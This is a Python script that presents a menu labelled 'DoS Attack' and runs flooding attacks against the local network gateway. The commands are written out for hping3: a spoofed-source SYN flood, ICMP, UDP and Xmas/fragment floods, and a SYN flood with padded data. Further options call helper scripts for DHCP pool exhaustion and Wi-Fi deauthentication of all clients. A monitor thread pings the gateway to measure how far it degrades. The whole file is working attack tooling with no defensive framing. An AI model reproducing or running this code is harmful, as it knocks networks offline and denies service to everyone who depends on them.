import os
import subprocess
import netifaces
import threading
import signal
import time
import re

from pathlib import Path
 
def check_root():
    if os.geteuid() != 0:
        print("This script must be run as root. Exiting.")
        exit(1)

def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None


def get_wireless_interfaces() -> list:
    wireless_ifaces = []
    try:
        for iface in netifaces.interfaces():
            wireless_path = f"/sys/class/net/{iface}/wireless"
            phy_path = f"/sys/class/net/{iface}/phy80211"
            
            if os.path.exists(wireless_path) or os.path.exists(phy_path):
                wireless_ifaces.append(iface)
            elif iface.startswith(('wlan', 'wlp', 'wlx', 'ath', 'ra', 'wifi')):
                wireless_ifaces.append(iface)
    except Exception:
        pass
    
    return wireless_ifaces


def choose_interface() -> str:
    wireless = get_wireless_interfaces()
    all_ifaces = netifaces.interfaces()
    
    all_ifaces = [i for i in all_ifaces if i != 'lo']
    
    print("\n" + "=" * 50)
    print(" Available Interfaces")
    print("=" * 50)
    
    if wireless:
        print("\n[Wireless Interfaces]")
        for i, iface in enumerate(wireless, 1):
            print(f"  {i}. {iface}")
    
    other = [i for i in all_ifaces if i not in wireless]
    if other:
        print("\n[Other Interfaces]")
        for i, iface in enumerate(other, len(wireless) + 1):
            print(f"  {i}. {iface}")
    
    print()
    
    combined = wireless + other
    
    if not combined:
        print("[!] No interfaces found!")
        return "wlan0"
    
    default = wireless[0] if wireless else combined[0]
    
    choice = input(f"Choose interface [{default}]: ").strip()
    
    if not choice:
        return default
    
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(combined):
            return combined[idx]
    
    if choice in combined:
        return choice
    
    print(f"[!] Invalid choice, using {default}")
    return default
 
def show_menu():
    print("=" * 50)
    print(" DoS Attack ")
    print("=" * 50)
    print("1. SYN FLood Attack (Spoofed)")
    print("2. ICMP Flood Attack")
    print("3. UDP Flood Attack")
    print("4. Fragment/Xmas Attack")
    print("5. Custom Data SYN Attack")
    print("6. DHCP Exhaustion Attack")
    print("7. Deauthenthication Attack(ALL CLIENTS)")
    print("8. Exit")
 
def run_hping3(option, gateway_ip=None, iface="wlan0"):
    if option == "1":
        cmd = ["hping3", "-i", iface, "-S", "--flood", "--rand-source", f"{gateway_ip}", "-p", "80"]
    elif option == "2":
        cmd = ["hping3", "-1", "-i", iface, "--flood", f"{gateway_ip}"]
    elif option == "3":
        cmd = ["hping3", "-2", "-S", "-i", iface, "--flood", "-p", "53", f"{gateway_ip}"]
    elif option == "4":
        cmd = ["hping3", "-F", "-x", "--flood", f"{gateway_ip}", "-p", "80"]
    elif option == "5":
        cmd = ["hping3", "-S", "--flood", "--data", "X"*1024, f"{gateway_ip}", "-p", "80"]
    elif option == "6":
        cmd = ["python3", str(Path(__file__).parent / "dhcp_exhaust.py"), "-i", iface]
    elif option == "7":
        cmd = ["python3", str(Path(__file__).parent / "deauth.py"), "-i", iface]
    elif option == "8":
        print("Exiting...")
        exit(0)    
    else:
        print("Invalid option.")
        return
    
    print("\n[*] Attack started. Press ENTER to stop...\n")
    print("-" * 50)
    
    if option == "6" or option == "7":
        process = subprocess.Popen(cmd)
    else:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    stop_event = threading.Event()
    
 
    stats = {
        'total_pings': 0,
        'successful': 0,
        'failed': 0,
        'slow': 0,  
        'latencies': []
    }
    
    def wait_for_enter():
        input()
        stop_event.set()
    
    def monitor_gateway():
        while not stop_event.is_set():
            try:
                start_time = time.time()
                ping_result = subprocess.run(
                    ["ping", "-c", "1", "-W", "5", gateway_ip],
                    capture_output=True,
                    text=True
                )
                elapsed = time.time() - start_time
                stats['total_pings'] += 1
                
                if ping_result.returncode == 0:
                    match = re.search(r'time=(\d+\.?\d*)', ping_result.stdout)
                    if match:
                        latency = float(match.group(1))
                        stats['latencies'].append(latency)
                        stats['successful'] += 1
                        
                        if latency > 2000: 
                            stats['slow'] += 1
                            status = " Dead"
                            color = "\033[93m"  
                        elif latency > 500:
                            status = "  Slow"
                            color = "\033[93m"  
                        else:
                            status = " OK"
                            color = "\033[92m"  #
                        
                        avg_latency = sum(stats['latencies']) / len(stats['latencies'])
                        print(f"{color}[MONITOR] Ping: {latency:.1f}ms | Status: {status} | "
                              f"Avg: {avg_latency:.1f}ms | Success: {stats['successful']}/{stats['total_pings']} | "
                              f"Failed: {stats['failed']} | Slow(>2s): {stats['slow']}\033[0m")
                else:
                    stats['failed'] += 1
                    print(f"\033[91m[MONITOR]  NO RESPONSE | "
                          f"Success: {stats['successful']}/{stats['total_pings']} | "
                          f"Failed: {stats['failed']} | Slow(>2s): {stats['slow']}\033[0m")
                          
            except Exception as e:
                stats['failed'] += 1
                print(f"\033[91m[MONITOR]  Error: {e}\033[0m")
            
            stop_event.wait(timeout=1)
    
    input_thread = threading.Thread(target=wait_for_enter, daemon=True)
    input_thread.start()
    
    if option != "6" and option != "7":
        monitor_thread = threading.Thread(target=monitor_gateway, daemon=True)
        monitor_thread.start()
    
    while process.poll() is None and not stop_event.is_set():
        stop_event.wait(timeout=0.1)
    
    if process.poll() is None:
        process.terminate()
        try:
            process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
 

def main():
    check_root()
    
    default_iface = choose_interface()
    print(f"\n[*] Using interface: {default_iface}")
    
    gateway_ip = get_gateway_ip()

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "8":
            break
        run_hping3(opt, gateway_ip, iface=default_iface)

if __name__ == "__main__":
    main()